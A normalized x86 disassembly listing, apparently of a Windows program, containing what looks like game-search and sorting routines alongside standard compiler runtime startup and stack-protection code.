mov eax [ edi + 0x4 ]
lea eax [ eax + ecx * 4 ]
imul eax eax 0xb
add eax [ edi ]
mov eax [ eax * 4 + r--data ]
mov eax [ eax * 4 + r--data ]
add eax ebx
mov [ esi + rw-data ] eax
pop esi
mov eax 0x25e4
pop ebx
mov esp ebp
pop ebp
retn
inc edx
sub eax 0xffffff80
cmp edx esi
jle r-xdata
mov edx [ esi + r--data ]
mov ebx [ edx * 4 + r--data ]
imul ebx [ esi + rw-data ]
add ebx [ edx * 4 + r--data ]
mov [ esi + rw-data ] ebx
cmp edx 0x6
jne r-xdata
mov esi rw-data
xor edi edi
cmp [ eax ] 0x0
jne r-xdata
add ecx 0x4
add esi 0x4
cmp ecx 0x80
jl r-xdata
mov eax [ edi + r--data ]
cmp eax [ ecx + r--data ]
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
add edi 0x4
cmp esi rw-data
jl r-xdata
mov eax [ ecx + rw-data ]
mov edx eax
shl edx 0x4
sub edx eax
mov eax 0x51eb851f
add edx edx
imul edx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
add [ edi + rw-data ] eax
dec [ ecx + rw-data ]
inc [ ecx + rw-data ]
cmp [ ecx + rw-data ] 0x0
jne r-xdata
xor ecx ecx
mov eax [ ebp + 0x10 ]
mov ebx [ eax ]
mov esi [ ebx * 4 + r--data ]
mov ecx esi
mov edx [ ebx * 4 + r--data ]
mov [ ebp - 0x8 ] esi
cmp ecx edx
jg r-xdata
imul edx [ ecx + rw-data ] 0x19
mov eax 0x51eb851f
mov [ ecx + rw-data ] 0x1
imul edx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
add [ edi + rw-data ] eax
jmp r-xdata
xor eax eax
mov [ rw-data ] 0x0
test ebx ebx
mov [ rw-data ] 0x20
sete al
mov edx [ eax * 4 + r--data ]
mov ecx edx
mov ebx [ eax * 4 + r--data ]
cmp ecx ebx
jg r-xdata
mov esi [ ebp - 0x4 ]
mov edi [ ebp + 0xc ]
nop [ eax ] eax
xor ecx ecx
cmp edx ebx
jg r-xdata
mov eax ecx
shl eax 0x5
add eax esi
lea edi [ eax * 4 + rw-data ]
mov eax [ ebp + 0xc ]
inc ecx
cmp ecx edx
jle r-xdata
mov eax [ ecx * 4 + rw-data ]
add eax [ ecx * 4 + rw-data ]
add esi eax
mov eax [ ebp - 0x4 ]
pop edi
pop esi
add eax ecx
pop ebx
mov esp ebp
pop ebp
retn
nop
cmp [ edi ] 0x0
jne r-xdata
mov eax [ ecx * 4 + rw-data ]
add eax [ ecx * 4 + rw-data ]
sub [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
cmp [ edi + ecx * 8 ] 0x0
je r-xdata
mov [ ebp - 0x4 ] esi
mov esi [ ebp - 0x8 ]
inc edx
cmp edx ebx
jle r-xdata
mov eax [ edx * 4 + rw-data ]
cmp eax ecx
cmovg ecx eax
cmp [ ecx * 4 + rw-data ] 0x0
mov [ rw-data ] 0x1
mov [ rw-data ] ecx
jl r-xdata
inc ecx
sub edi 0xffffff80
cmp ecx ebx
jle r-xdata
cmp [ edx * 4 + rw-data ] 0x0
jge r-xdata
mov edi [ ebp + 0x10 ]
xor ecx ecx
mov eax [ edi ]
mov edx [ eax * 4 + r--data ]
cmp esi edx
jg r-xdata
cmp [ eax + ecx * 8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
sub eax ecx
pop ebx
mov esp ebp
pop ebp
retn
cmp [ esi * 4 + rw-data ] 0x0
jge r-xdata
inc esi
cmp esi edx
jle r-xdata
mov eax [ esi * 4 + rw-data ]
cmp eax ecx
cmovg ecx eax
sub_40bb60
push ebp
mov ebp esp
mov edx [ ebp + 0x18 ]
sub esp 0x1c
mov eax edx
push esi
mov esi [ ebp + 0x14 ]
sub eax esi
test eax eax
jle r-xdata
pop esi
mov esp ebp
pop ebp
retn
push ebx
mov ebx [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x10 ]
lea eax [ esi + edx ]
cdq
sub eax edx
mov edx [ ebp + 0xc ]
sar eax 0x1
mov esi [ edx + eax * 4 ]
lea edx [ edx + eax * 4 ]
mov edi [ ebx + eax * 4 ]
lea ecx [ ebx + eax * 4 ]
mov [ ebp - 0x10 ] esi
mov esi [ ebp + 0x10 ]
lea esi [ esi + eax * 8 ]
mov [ ebp - 0x4 ] edi
mov eax [ esi ]
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x14 ]
lea eax [ ebx + eax * 4 ]
mov [ ebp - 0x8 ] eax
mov eax [ eax ]
mov [ ecx ] eax
mov eax [ ebp - 0x8 ]
mov [ eax ] edi
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
mov ecx [ edx ]
lea eax [ eax + edi * 4 ]
mov [ ebp - 0xc ] eax
mov eax [ eax ]
mov [ edx ] eax
mov eax [ ebp - 0xc ]
mov [ eax ] ecx
mov eax [ ebp + 0x10 ]
mov ecx [ esi ]
lea edi [ eax + edi * 8 ]
mov eax [ edi ]
mov edx [ esi + 0x4 ]
mov [ esi ] eax
mov eax [ edi + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp + 0x18 ]
mov esi eax
mov [ ebp - 0x14 ] edi
mov [ edi ] ecx
mov [ edi + 0x4 ] edx
mov edi [ ebp + 0x14 ]
lea eax [ ebx + eax * 4 ]
inc edi
mov eax [ ebx + edx * 4 ]
cmp eax [ ebx + esi * 4 ]
jg r-xdata
cmp ecx [ eax ]
jle r-xdata
nop [ eax ] eax
mov ecx eax
mov eax [ ebx + esi * 4 ]
mov [ ebx + edx * 4 ] eax
mov edx [ ebp + 0xc ]
mov [ ebx + esi * 4 ] ecx
mov ebx [ ebp + 0x18 ]
mov eax [ edx + esi * 4 ]
mov ecx [ edx + ebx * 4 ]
mov [ edx + ebx * 4 ] eax
mov [ edx + esi * 4 ] ecx
mov eax [ edi + esi * 8 ]
mov ecx [ edi + ebx * 8 ]
mov edx [ edi + ebx * 8 + 0x4 ]
mov [ edi + ebx * 8 ] eax
mov eax [ edi + esi * 8 + 0x4 ]
mov [ edi + ebx * 8 + 0x4 ] eax
mov [ edi + esi * 8 ] ecx
mov [ edi + esi * 8 + 0x4 ] edx
cmp edi esi
jge r-xdata
nop
inc edi
cmp edi esi
jle r-xdata
mov eax [ ebx + esi * 4 ]
mov edx [ ebp - 0x8 ]
mov edi [ ebp + 0x10 ]
mov [ edx ] eax
mov edx [ ebp - 0xc ]
mov [ ebx + esi * 4 ] ecx
mov ecx [ ebp + 0xc ]
mov eax [ ecx + esi * 4 ]
mov [ edx ] eax
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
mov [ ecx + esi * 4 ] eax
mov eax [ edi + esi * 8 ]
mov [ edx ] eax
mov eax [ edi + esi * 8 + 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp + 0x14 ]
mov [ edi + esi * 8 ] eax
mov eax [ ebp - 0x1c ]
mov [ edi + esi * 8 + 0x4 ] eax
lea eax [ esi - 0x1 ]
cmp edx eax
jge r-xdata
mov ecx [ ebx + edi * 4 ]
lea edx [ ebx + esi * 4 ]
mov eax [ edx ]
mov [ ebx + edi * 4 ] eax
mov ebx [ ebp + 0x10 ]
mov [ edx ] ecx
mov edx [ ebp + 0xc ]
mov ecx [ edx + edi * 4 ]
mov eax [ edx + esi * 4 ]
mov [ edx + edi * 4 ] eax
mov eax [ ebp + 0x10 ]
mov [ edx + esi * 4 ] ecx
mov ecx [ eax + edi * 8 ]
mov edx [ eax + edi * 8 + 0x4 ]
mov eax [ eax + esi * 8 ]
mov [ ebx + edi * 8 ] eax
mov eax ebx
mov eax [ eax + esi * 8 + 0x4 ]
mov [ ebx + edi * 8 + 0x4 ] eax
mov eax ebx
mov ebx [ ebp + 0x8 ]
mov [ eax + esi * 8 ] ecx
mov [ eax + esi * 8 + 0x4 ] edx
lea eax [ ebx + esi * 4 ]
jmp r-xdata
dec esi
cmp ecx [ ebx + esi * 4 ]
jg r-xdata
cmp [ ebx + edi * 4 ] ecx
jl r-xdata
mov edx [ ebp + 0x18 ]
inc esi
mov [ ebp + 0x14 ] esi
cmp esi edx
jge r-xdata
push eax
push edx
push edi
push ecx
push ebx
call sub_40bb60
add esp 0x14
mov ecx [ ebp - 0x4 ]
cmp edi esi
jg r-xdata
pop edi
pop ebx
mov eax edx
sub eax esi
test eax eax
jg r-xdata
cmp eax 0x1
jne r-xdata
pop edi
pop ebx
pop esi
mov esp ebp
pop ebp
retn
sub_40bd40
push ebp
mov ebp esp
sub esp 0x810
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x1c ]
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x14 ]
push edi
mov edi [ ebp + 0xc ]
mov [ ebp - 0x7e0 ] ebx
mov [ ebp - 0x800 ] eax
lea eax [ eax + eax * 2 ]
lea eax [ ecx + eax * 4 ]
mov [ ebp - 0x7e8 ] esi
mov ebx [ edi + esi * 8 ]
mov [ ebp - 0x7f4 ] ebx
mov ebx [ edi + esi * 8 + 0x4 ]
lea esi [ edx + eax * 4 ]
mov [ ebp - 0x7f8 ] ebx
xor eax eax
mov ebx [ ebp - 0x7e0 ]
mov [ ebp - 0x804 ] ecx
mov ecx [ esi ]
mov [ ebp - 0x7f0 ] edx
cmp [ ebx ] eax
mov [ ebp - 0x7e4 ] edi
sete al
mov [ ebp - 0x7fc ] 0x20
mov [ ebp - 0x808 ] esi
cmp [ ecx * 4 + r--data ] eax
jne r-xdata
mov eax [ ebp - 0x7e8 ]
mov ecx [ ebp + 0x24 ]
mov [ esi ] eax
dec ecx
mov eax [ ebp - 0x7f4 ]
mov esi [ ebp - 0x7f8 ]
mov [ ebp + 0x24 ] ecx
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax * 4 ]
mov esi [ ebp - 0x7e8 ]
lea eax [ edx + eax * 4 ]
mov [ eax ] 0x20
mov [ ebp - 0x810 ] eax
mov eax [ ebp - 0x800 ]
mov [ edi + esi * 8 ] eax
mov eax [ ebp - 0x804 ]
mov [ edi + esi * 8 + 0x4 ] eax
xor eax eax
cmp [ ebx ] eax
sete al
mov [ ebx ] eax
test ecx ecx
jle r-xdata
mov [ ebp - 0x7fc ] ecx
test ecx ecx
je r-xdata
push ebx
push edi
push edx
call sub_40b850
add esp 0xc
mov esi eax
jmp r-xdata
lea eax [ ebp - 0x7dc ]
push eax
lea eax [ ebp - 0x7d4 ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
push ebx
push edi
push edx
call sub_408f00
add esp 0x18
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0x270f
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn
cmp ecx 0x10
je r-xdata
mov eax [ ebp - 0x7e8 ]
mov ecx [ ebp - 0x7f4 ]
mov [ edi + eax * 8 ] ecx
mov ecx [ ebp - 0x7f8 ]
mov [ edi + eax * 8 + 0x4 ] ecx
mov ecx [ ebp - 0x810 ]
mov [ ecx ] eax
mov eax [ ebp - 0x7fc ]
cmp eax 0x20
je r-xdata
mov esi 0x2648
jmp r-xdata
mov edx [ ebp + 0x24 ]
mov eax [ ebp - 0x7dc ]
cmp edx 0x2
jl r-xdata
mov [ edi + ecx * 8 ] 0x0
mov ecx [ ebp - 0x808 ]
mov [ ecx ] 0x20
mov ecx [ ebp - 0x800 ]
mov [ edi + eax * 8 ] ecx
mov ecx [ ebp - 0x804 ]
mov [ edi + eax * 8 + 0x4 ] ecx
mov ecx [ ebp - 0x808 ]
mov [ ecx ] eax
jmp r-xdata
xor edi edi
mov [ ebp - 0x7d8 ] eax
mov esi 0xffffd8f0
test eax eax
jle r-xdata
xor ecx ecx
mov esi 0xffffd8f0
mov [ ebp - 0x7ec ] ecx
test eax eax
jle r-xdata
mov ecx [ ebp - 0x4 ]
xor eax eax
cmp [ ebx ] eax
pop edi
sete al
neg esi
mov [ ebx ] eax
xor ecx ebp
mov eax esi
pop esi
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn
mov edi [ ebp - 0x7e4 ]
neg [ ebp + 0x20 ]
lea ebx [ ebp - 0x7d4 ]
dec eax
push eax
push 0x0
lea eax [ ebp - 0x7d4 ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
lea eax [ ebp - 0x3ec ]
push eax
call sub_40bb60
mov edx [ ebp + 0x24 ]
add esp 0x14
mov eax 0x7
add edx 0xfffffffe
lea eax [ ebp - 0x7d4 ]
mov [ ebp - 0x80c ] edx
mov [ ebp - 0x7d8 ] eax
nop [ eax + eax ] eax
mov ebx [ ebp - 0x7e0 ]
mov edx [ ebp + 0x24 ]
inc edi
add ebx 0x8
cmp edi [ ebp - 0x7d8 ]
jl r-xdata
push edx
push 0xffffd8f0
push [ eax + 0x4 ]
push [ eax ]
push [ ebp + ecx * 4 - 0x1f8 ]
push ebx
push edi
push [ ebp - 0x7f0 ]
call sub_40bd40
mov ecx [ ebp - 0x7ec ]
add esp 0x20
mov edx [ ebp - 0x80c ]
cmp eax esi
cmovg esi eax
mov [ ebp + ecx * 4 - 0x3ec ] eax
inc ecx
mov eax [ ebp - 0x7d8 ]
add eax 0x8
mov [ ebp - 0x7ec ] ecx
mov [ ebp - 0x7d8 ] eax
cmp ecx [ ebp - 0x7dc ]
jl r-xdata
mov eax [ ebp - 0x7dc ]
push edx
push esi
push [ ebx + 0x4 ]
push [ ebx ]
push [ ebp + edi * 4 - 0x1f8 ]
push [ ebp - 0x7e0 ]
push [ ebp - 0x7e4 ]
push [ ebp - 0x7f0 ]
call sub_40bd40
add esp 0x20
cmp eax esi
cmovg esi eax
cmp eax [ ebp + 0x20 ]
jge r-xdata
sub_40c040
push ebp
mov ebp esp
sub esp 0x7ec
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x18 ]
push esi
mov esi [ ebp + 0x14 ]
push edi
lea edi [ ebp - 0x7d8 ]
mov [ ebp - 0x7e4 ] eax
push edi
lea edi [ ebp - 0x5e0 ]
mov [ ebp - 0x7e0 ] ecx
push edi
lea edi [ ebp - 0x1f8 ]
mov [ ebp - 0x7dc ] edx
push edi
push edx
push ecx
push eax
mov [ ebp - 0x7ec ] esi
mov [ ebp - 0x7e8 ] ebx
call sub_408f00
add esp 0x18
test eax eax
je r-xdata
mov ecx [ ebp - 0x7d8 ]
test ecx ecx
jle r-xdata
mov eax [ ebp - 0x7d8 ]
mov esi 0xffffd8f0
test eax eax
jle r-xdata
mov ecx [ ebp - 0x4 ]
xor eax eax
pop edi
mov [ esi ] 0x20
xor ecx ebp
pop esi
mov [ ebx ] 0x0
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn
mov eax [ ebp + ecx * 4 - 0x1fc ]
mov [ esi ] eax
mov eax [ ebp + ecx * 8 - 0x5e8 ]
mov [ ebx ] eax
mov eax [ ebp + ecx * 8 - 0x5e4 ]
pop edi
mov [ ebx + 0x4 ] eax
mov eax 0x1
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn
dec eax
push eax
push 0x0
lea eax [ ebp - 0x5e0 ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
lea eax [ ebp - 0x7d4 ]
push eax
call sub_40bb60
mov ecx 0xffffd8f0
lea esi [ ebp - 0x5e0 ]
add esp 0x14
mov [ ebp - 0x7d8 ] ecx
xor edi edi
lea edi [ ebp - 0x5e0 ]
xor ebx ebx
inc edi
add esi 0x8
cmp edi 0x7
jl r-xdata
mov edx [ ebp - 0x7ec ]
mov ecx eax
mov eax [ ebp + edi * 4 - 0x1f8 ]
mov [ ebp - 0x7d8 ] ecx
mov [ edx ] eax
mov eax [ esi ]
mov [ ebx ] eax
mov eax [ esi + 0x4 ]
mov [ ebx + 0x4 ] eax
push 0x4
push 0xffffd8f0
push [ edi + 0x4 ]
push [ edi ]
push [ ebp + ebx * 4 - 0x1f8 ]
push [ ebp - 0x7dc ]
push [ ebp - 0x7e0 ]
push [ ebp - 0x7e4 ]
call sub_40bd40
add esp 0x20
mov [ ebp + ebx * 4 - 0x7d4 ] eax
cmp eax esi
lea edi [ edi + 0x8 ]
cmovg esi eax
mov eax [ ebp - 0x7d8 ]
inc ebx
cmp ebx eax
jl r-xdata
mov ebx [ ebp - 0x7e8 ]
push 0x6
push ecx
push [ esi + 0x4 ]
push [ esi ]
push [ ebp + edi * 4 - 0x1f8 ]
push [ ebp - 0x7dc ]
push [ ebp - 0x7e0 ]
push [ ebp - 0x7e4 ]
call sub_40bd40
mov ecx [ ebp - 0x7d8 ]
add esp 0x20
cmp eax ecx
jle r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn
sub_40c344
push ebp
mov ebp esp
jmp r-xdata
push [ ebp + 0x8 ]
call sub_429a2d
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_429937
pop ecx
test eax eax
jne r-xdata
pop ebp
retn
cmp [ ebp + 0x8 ] 0xffffffff
jne r-xdata
call sub_40c7d0
call sub_40c7ed
sub_40c3a0
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax

cmp ecx eax
r-xdata
sub_40c3cd
push esi
push 0x2
call sub_429dd6
call sub_40cfa0
push eax
call sub_42b106
call sub_42cafa
mov esi eax
call sub_40cf9d
push 0x1
mov [ esi ] eax
call sub_40cd10
add esp 0xc
pop esi
test al al
je r-xdata
push 0x7
call sub_40d022
int3
fnclex
call sub_40d20c
push sub_40d237
call sub_40cee5
call sub_40cf99
push eax
call sub_42a660
pop ecx
pop ecx
test eax eax
jne r-xdata
call sub_40cfac
call sub_40d00a
test eax eax
je r-xdata
call sub_40cfe5
call sub_40cfe6
call sub_40cfc4
call sub_40cfa9
push eax
call sub_42baed
pop ecx
call j_sub_42a72c
call sub_40d170
xor eax eax
retn
push sub_40cf96
call sub_429ec4
pop ecx
sub_40c48c
push 0x14
push r--data
call sub_40d270
push 0x1
call sub_40ccd7
pop ecx
test al al
jne r-xdata
xor bl bl
mov [ ebp - 0x19 ] bl
and [ ebp - 0x4 ] 0x0
call sub_40cbed
mov [ ebp - 0x24 ] al
mov eax [ rw-data ]
xor ecx ecx
inc ecx
cmp eax ecx
je r-xdata
push 0x7
call sub_40d022
test eax eax
jne r-xdata
mov bl cl
mov [ ebp - 0x19 ] bl
mov [ rw-data ] ecx
push r--data
push r--data
call sub_42b089
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_40d01c
mov esi eax
cmp [ esi ] edi
je r-xdata
push esi
call sub_40cda7
pop ecx
test al al
je r-xdata
push r--data
push r--data
call sub_42b02d
pop ecx
pop ecx
mov [ rw-data ] 0x2
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax 0xff
jmp r-xdata
push edi
call sub_40e388
pop ecx
call sub_40d13d
movzx eax ax
push eax
call sub_42af94
push eax
push edi
push __dos_header
call sub_4061b0
mov esi eax
push edi
call sub_40e424
pop ecx
call sub_40d173
test al al
jne r-xdata
push esi
call sub_40cda7
pop ecx
test al al
je r-xdata
push edi
push 0x2
push edi
mov esi [ esi ]
mov ecx esi
call j_sub_40d4a2
call esi
push [ ebp - 0x24 ]
call sub_40ce34
pop ecx
call sub_40d016
mov esi eax
xor edi edi
cmp [ esi ] edi
je r-xdata
call sub_40d2b6
retn
test bl bl
jne r-xdata
push esi
call sub_417218
push [ esi ]
call sub_4171e0
pop ecx
push edi
push 0x1
call sub_40ce51
pop ecx
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
mov eax esi
jmp r-xdata
call sub_4171b5
sub_40c5d3
mov esp [ ebp - 0x18 ]
call sub_40d173
test al al
jne r-xdata
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
push [ ebp - 0x20 ]
call sub_4171c4
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_40d2b6
retn
call sub_4171a6
sub_40c65b
push ebp
mov ebp esp
push ecx
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ ebp - 0x4 ] esi
call sub_40c6cd
mov [ esi ] r--data
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_40c694
push ebp
mov ebp esp
push ecx
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ ebp - 0x4 ] esi
call sub_40c6cd
mov [ esi ] r--data
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_40c6cd
push ebp
mov ebp esp
push esi
mov esi ecx
lea eax [ esi + 0x4 ]
mov [ esi ] r--data
and [ eax ] 0x0
and [ eax + 0x4 ] 0x0
push eax
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call sub_40e6d1
pop ecx
pop ecx
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40c749
push ebp
mov ebp esp
push esi
mov esi ecx
lea eax [ esi + 0x4 ]
mov [ esi ] r--data
push eax
call sub_40e734
test [ ebp + 0x8 ] 0x1
pop ecx
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push 0xc
push esi
call sub_40c377
pop ecx
pop ecx
sub_40c776
push ebp
mov ebp esp
push esi
mov esi ecx
lea eax [ esi + 0x4 ]
mov [ esi ] r--data
push eax
call sub_40e734
test [ ebp + 0x8 ] 0x1
pop ecx
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push 0xc
push esi
call sub_40c377
pop ecx
pop ecx
sub_40c7a3
push ebp
mov ebp esp
push esi
mov esi ecx
lea eax [ esi + 0x4 ]
mov [ esi ] r--data
push eax
call sub_40e734
test [ ebp + 0x8 ] 0x1
pop ecx
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push 0xc
push esi
call sub_40c377
pop ecx
pop ecx
sub_40c844
push ebp
mov ebp esp
sub esp 0x324
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x324 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov [ rw-data ] 0x1
push 0x4
pop eax
imul eax eax 0x0
mov [ eax + rw-data ] 0x2
push 0x4
pop eax
imul eax eax 0x0
mov ecx [ rw-data ]
mov [ ebp + eax - 0x8 ] ecx
push 0x4
pop eax
shl eax 0x0
mov ecx [ rw-data ]
mov [ ebp + eax - 0x8 ] ecx
push r--data
call sub_40c81c
mov esp ebp
pop ebp
retn
push 0x2
pop ecx
int 0x29
sub_40c94b
push ebp
mov ebp esp
sub esp 0x31c
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x31c ]
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov [ rw-data ] 0x1
push 0x4
pop eax
imul eax eax 0x0
mov ecx [ ebp + 0x8 ]
mov [ eax + rw-data ] ecx
push r--data
call sub_40c81c
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
int 0x29
sub_40ca1b
push ebp
mov ebp esp
sub esp 0x320
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x8 ]
int 0x29
cmp [ ebp + 0xc ] 0xe
jbe r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
inc eax
mov [ rw-data ] eax
push 0x4
pop eax
imul eax eax 0x0
mov ecx [ ebp + 0x8 ]
mov [ eax + rw-data ] ecx
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax [ ebp + 0xc ]
dec eax
mov [ ebp + 0xc ] eax
and [ ebp + 0xc ] 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0xc ]
jae r-xdata
push r--data
call sub_40c81c
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x10 ]
mov ecx [ edx + ecx * 4 ]
mov [ eax * 4 + rw-data ] ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x4 ] eax
sub_40cb6f
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
lea edx [ ecx + 0x18 ]
add edx eax
movzx eax [ ecx + 0x6 ]
imul esi eax 0x28
add esi edx
cmp edx esi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
add edx 0x28
cmp edx esi
jne r-xdata
mov eax [ edx + 0x8 ]
add eax [ edx + 0xc ]
cmp ecx eax
jb r-xdata
cmp ecx [ edx + 0xc ]
jb r-xdata
mov eax edx
jmp r-xdata
pop esi
pop ebp
retn
sub_40cbb3
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov ecx 0x5a4d
cmp [ eax ] cx
jne r-xdata
xor al al
pop ebp
retn
mov ecx [ eax + 0x3c ]
add ecx eax
cmp [ ecx ] 0x4550
jne r-xdata
mov eax 0x10b
cmp [ ecx + 0x18 ] ax
sete al
pop ebp
retn
sub_40cbed
call sub_40d496
test eax eax
jne r-xdata
mov eax [ fs : 0x18 ]
push esi
mov esi rw-data
mov edx [ eax + 0x4 ]
jmp r-xdata
xor al al
retn
xor eax eax
mov ecx edx
[ esi ] ecx
test eax eax
jne r-xdata
cmp edx eax
je r-xdata
xor al al
pop esi
retn
mov al 0x1
pop esi
retn
sub_40cc74
push ebp
mov ebp esp
call sub_40d496
test eax eax
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
call sub_429a5c
pop ecx
pop ecx
pop ebp
retn
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
push eax
push [ ebp + 0x8 ]
call j_sub_40d4a2
call [ ebp + 0x14 ]
sub_40ccd7
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
call sub_40d2f5
call sub_40e7c1
test al al
jne r-xdata
mov [ rw-data ] 0x1
call sub_42d148
test al al
jne r-xdata
xor al al
pop ebp
retn
mov al 0x1
pop ebp
retn
push 0x0
call sub_40e805
pop ecx
jmp r-xdata
sub_40cd10
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_40d496
test eax eax
je r-xdata
cmp esi 0x1
jne r-xdata
mov eax [ rw-data ]
lea esi [ ebp - 0xc ]
push edi
and eax 0x1f
mov edi rw-data
push 0x20
pop ecx
sub ecx eax
or eax 0xffffffff
ror eax cl
xor eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi rw-data
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
lea esi [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
mov al 0x1
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
test esi esi
jne r-xdata
push 0x5
call sub_40d022
int3
push rw-data
call sub_42cfb6
pop ecx
test eax eax
je r-xdata
